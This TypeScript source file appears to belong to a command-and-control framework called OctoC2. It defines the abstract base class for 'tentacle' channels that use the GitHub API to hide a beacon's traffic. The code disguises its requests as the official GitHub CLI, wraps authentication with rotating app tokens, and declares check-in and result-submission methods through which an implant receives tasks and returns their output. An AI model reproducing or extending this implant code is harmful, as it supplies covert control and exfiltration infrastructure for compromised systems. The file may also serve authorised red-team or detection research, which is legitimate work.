/**
 * OctoC2 — BaseTentacle
 *
 * Abstract base for all tentacle channel implementations.
 * Phase 2 will provide concrete subclasses:
 *   IssuesTentacle, ActionsTentacle, BranchTentacle, GistTentacle, etc.
 *
 * Each tentacle gets a shared Octokit client, the beacon config,
 * and a reference to the libsodium crypto context.
 */

import { Octokit } from "@octokit/rest";
import { buildTokenGetter } from "../lib/AppTokenManager.ts";
import type { ITentacle, TentacleKind, CheckinPayload, Task, TaskResult, BeaconConfig } from "../types.ts";

export abstract class BaseTentacle implements ITentacle {
  abstract readonly kind: TentacleKind;

  protected readonly octokit: Octokit;
  protected readonly config: BeaconConfig;

  constructor(config: BeaconConfig) {
    this.config = config;
    this.octokit = new Octokit({
      auth: config.token,
      userAgent: process.env.OCTOC2_USER_AGENT ?? "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
      // Retry on 429 (rate limit) automatically
      throttle: undefined,
    });

    // If GitHub App credentials are present, wrap all Octokit requests to
    // inject short-lived installation tokens (1-hour TTL) transparently.
    // buildTokenGetter() returns a PAT no-op when App fields are absent,
    // so this branch only activates when all three fields are set.
    if (config.appId && config.installationId && config.appPrivateKey) {
      const getToken = buildTokenGetter(config);
      this.octokit.hook.wrap("request", async (request, options) => {
        const token = await getToken();
        options.headers = {
          ...options.headers,
          authorization: `token ${token}`,
        };
        return request(options);
      });
    }
  }

  /** Default availability check — verify token works with a lightweight call */
  async isAvailable(): Promise<boolean> {
    try {
      await this.octokit.rest.repos.get({
        owner: this.config.repo.owner,
        repo: this.config.repo.name,
      });
      return true;
    } catch {
      return false;
    }
  }

  abstract checkin(payload: CheckinPayload): Promise<Task[]>;
  abstract submitResult(result: TaskResult): Promise<void>;

  async teardown(): Promise<void> {
    // No-op by default — override in tentacles that hold connections
  }
}
